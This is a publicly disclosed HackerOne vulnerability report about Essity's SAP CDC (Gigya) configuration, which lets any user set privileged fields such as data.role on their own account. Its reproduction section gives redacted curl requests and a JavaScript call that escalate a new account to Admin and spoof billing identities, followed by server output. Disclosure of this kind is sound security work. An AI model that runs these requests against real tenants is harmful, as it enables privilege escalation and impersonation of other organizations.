---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-privilege-management
  - env/web
  - vuln/privilege-escalation
  - vuln/misconfiguration
  - vuln/jwt
  - impact/account-takeover
  - impact/sensitive-data
  - trigger/unauthenticated
  - trigger/auth-required
substate: "resolved"
weakness: "Improper Privilege Management"
enriched: true
body: true
date: 2026-05-20
submitted: 2026-05-11T12:06:02.746Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/essity|Essity]]"
reporter: "matty69v"
source: "https://hackerone.com/reports/3726887"
title: "Privilege-relevant fields are clientModify in SAP CDC schema allowing role escalation to Admin"
---
# Privilege-relevant fields are clientModify in SAP CDC schema allowing role escalation to Admin

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 9 | **Program:** Essity | **Disclosed:** 2026-05-20

- Report: [https://hackerone.com/reports/3726887](https://hackerone.com/reports/3726887)
- CWE: Improper Privilege Management
- Submitted: 2026-05-11T12:06:02.746Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

The Gigya / SAP CDC tenant fronting all four `████████.*` sites (████████) was configured with incorrect `writeAccess` permissions on role-and-billing-relevant fields. The full schema is returned unauthenticated by `accounts.getSchema`, and critical fields including `data.role`, `data.org.bpid`, `data.soldTo`, `data.crmId`, `data.orgName`, and others all carry `"writeAccess":"clientModify"`  meaning **any authenticated end-user can set them on their own account from the browser** via the public `accounts.████████` API.

Two of these fields —`data.role` and the per-org `data.org.roles.name`  are the exact fields the `████████.*` login flow reads to determine which authenticated session to issue. The inline login script on every locale executes `gigya.accounts.getAccountInfo` and reads the role from `groups.organizations[0].roles[0]`, then forwards the entire account info object (including user-modifiable `data` fields) to `/████████`.

## Affected Fields with clientModify WriteAccess

```
data.role                       data.org.bpid              data.org.roles.name
data.orgName                    data.orgEntered.orgName    data.orgEntered.duns
data.orgEntered.address.*       data.orgEntered.roles.name
data.crmId                      data.soldTo                data.defaultSoldTo
data.unit                       data.area                  data.level
data.deactivated                data.subscribe             data.terms
data.requestedCompanies         data.additionalCompany
profile.email                   profile.firstName          profile.lastName
profile.city / state / address / zip / country / work.title
```

## Steps To Reproduce

### 1. Verify clientModify writeAccess (no authentication required)

```bash
curl -sk -H "X-HackerOne-Research: ████████" \
     -X POST 'https://████████/accounts.getSchema' \
     --data-urlencode 'apiKey=████████' \
     --data-urlencode 'format=json' \
| python3 -c "
import sys,json
d = json.load(sys.stdin)
critical = ['role','org.bpid','orgName','crmId','soldTo','defaultSoldTo','unit','area','level','deactivated','org.roles.name']
ds = d['dataSchema']['fields']
print('field | writeAccess')
for f in critical:
    if f in ds: print(f'  {f:25s} | {ds[f][\"writeAccess\"]}')"
```

**Output:**
```
field | writeAccess
  role                      | clientModify
  org.bpid                  | clientModify
  orgName                   | clientModify
  crmId                     | clientModify
  soldTo                    | clientModify
  defaultSoldTo             | clientModify
  unit                      | clientModify
  area                      | clientModify
  level                     | clientModify
  deactivated               | clientModify
  org.roles.name            | clientModify
```

### 2. End-to-end PoC: Anonymous attacker becomes role: Admin

**Step 1 - Initialize registration:**
```bash
curl -sk -H "X-HackerOne-Research: ████████" \
     -X POST 'https://████████/accounts.initRegistration' \
     --data-urlencode 'apiKey=████████' \
     --data-urlencode 'format=json'
# → regToken: ████████
```

**Step 2 - Register account:**
```bash
curl -sk -H "X-HackerOne-Research: ████████" \
     -X POST 'https://████████/accounts.register' \
     --data-urlencode 'apiKey=████████' \
     --data-urlencode "regToken=$REGTOK" \
     --data-urlencode 'email=████████' \
     --data-urlencode 'password=████████' \
     --data-urlencode 'profile={"firstName":"H1Research","lastName":"████████-DO-NOT-APPROVE"}' \
     --data-urlencode 'data={"role":"User","terms":true,"subscribe":false}' \
     --data-urlencode 'finalizeRegistration=true' \
     --data-urlencode 'include=data,profile' \
     --data-urlencode 'format=json'
# → UID: ████████, data.role: "User"
```

**Step 3 - Exploit: Overwrite role to Admin + billing identity:**
```bash
curl -sk -H "X-HackerOne-Research: ████████" \
     -X POST 'https://████████/accounts.████████' \
     --data-urlencode 'apiKey=████████' \
     --data-urlencode "regToken=$REGTOK" \
     --data-urlencode 'data={"role":"Admin","soldTo":"9999999991","crmId":"H1████████-CRM","defaultSoldTo":"9999999991","unit":"H1-RESEARCH","area":"H1-RESEARCH","level":"Admin","deactivated":false,"orgName":"H1-████████-DO-NOT-APPROVE-ADMIN"}' \
     --data-urlencode 'format=json'
# → {"errorCode":0,"statusCode":200}
```

**Step 4 - Verify persistence:**
```bash
curl -sk -H "X-HackerOne-Research: ████████" \
     -X POST 'https://████████/accounts.getAccountInfo' \
     --data-urlencode 'apiKey=████████' \
     --data-urlencode "regToken=$REGTOK" \
     --data-urlencode 'include=data,profile,groups,emails,id_token' \
     --data-urlencode 'format=json'
```

**Server response (abridged):**
```json
{
  "errorCode":0,
  "UID":"████████",
  "data":{
    "role":"Admin",
    "soldTo":"9999999991",
    "defaultSoldTo":"9999999991",
    "crmId":"H1████████-CRM",
    "orgName":"H1-████████-DO-NOT-APPROVE-ADMIN",
    "unit":"H1-RESEARCH",
    "area":"H1-RESEARCH",
    "level":"Admin",
    "deactivated":false
  },
  "isActive":true,
  "isRegistered":true,
  "id_token":"████████"
}
```

Every attacker-chosen value persisted server-side. The account is `isRegistered: true` and the server issued a signed Gigya FIDM JWT asserting the elevated identity.

### 3. How clientModify enables exploitation

Because `writeAccess: clientModify` is set on `data.role` and related fields, any authenticated user can call:

```js
gigya.accounts.████████({
    data: { 
        role: "Admin", 
        soldTo: "999999991", 
        bpid: "999999991_0614_33_03", 
        orgName: "████████" 
    }
})
```

SAP CDC accepts the write. The ████████ login flow then reads these client-modified fields when calling `getAccountInfo` and uses them to determine session privileges via `/████████`.

## Supporting Material/References

- Test account UID: `████████`
- Test email: `████████`
- **Note for triage:** This test account was created in production strictly as PoC evidence. Please request the SAP CDC admin team to delete it.
- Per SAP CDC documentation, fields used for authorization MUST be `serverOnly` or at most `clientRead`. `clientModify` on `data.role` is explicitly called out as a misconfiguration anti-pattern in SAP's hardening guide.

## Impact

An authenticated attacker can escalate privileges to Admin role and impersonate other organizations on all four ████████).

**Specific impacts:**

1. **B2B Account Takeover / Role Escalation:** Any registered user can self-promote their `data.role` to "Admin" or any other privileged value the server recognizes, gaining unauthorized administrative access to the ████████ portal.

2. **Cross-Customer Impersonation:** By spoofing `data.org.bpid`, `data.soldTo`, `data.crmId`, and `data.orgName`, an attacker can impersonate other organizations and access their sensitive business data, orders, and pricing information.

3. **Deactivation Bypass:** Users can set `data.deactivated: false` to keep their accounts active even after back-office deactivation, circumventing security controls.

4. **Consent/GDPR Violation:** Attackers can tamper with `data.subscribe` and `data.terms` fields to bypass marketing consent flags while maintaining account access, potentially causing GDPR compliance violations for the data controller.

5. **Billing and Sales Territory Manipulation:** By modifying `data.unit`, `data.area`, and `data.level` fields, attackers can misrepresent their sales territory assignments and potentially manipulate pricing, routing, or order placement logic.

6. **████████:** ████████:
   - ████████
   - ████████
   - ████████`████████` ████████
   - ████████ `████████`

The root cause is that SAP CDC schema configuration allows client-side modification of authorization-critical fields, violating the principle that authorization decisions must be based on server-controlled data only.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2026-05-11** @matty69v: Hello @████████ thanks im wondering even if it's not a bug Bounty you offer little bonus or bounty for critical vulns ?

Matty
- **2026-05-11** @hugolevisse: Hello @████████ 

Unfortunately we do not have a bug bounty program. We do however appreciate your help through this VDP to help strengthen Essity's security posture.

Best regards,
Essity AppSec Team
- **2026-05-11** @matty69v: No problem waiting for team to resolve it and will continue secure this
- **Report Resolved**
- **2026-05-18** @matty69v: Thanks @████████ can we disclose this report ?
- **2026-05-18** @ariannac: Hi @████████ 

Could you please clarify in which setting you would like to disclose this report? Is it a research paper or personal blog? 
We would like to review what you plan to disclose before you move ahead with it and ensure certain aspects are redacted.

Best regards,
Essity AppSec Team
- **2026-05-18** @matty69v: Hello @████████ public on h1
- **2026-05-18** @ariannac: Sure. We don't have the option on our side but if you can request it from yours we are happy to accept that after agreed parts are redacted.
- **2026-05-18** @matty69v: Only the host of the program can disclose publicly not me... it's a program parameter i guess
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2026-05-20** @matty69v: Thanks @ariannac waiting for the others report really enjoyable to work with your team
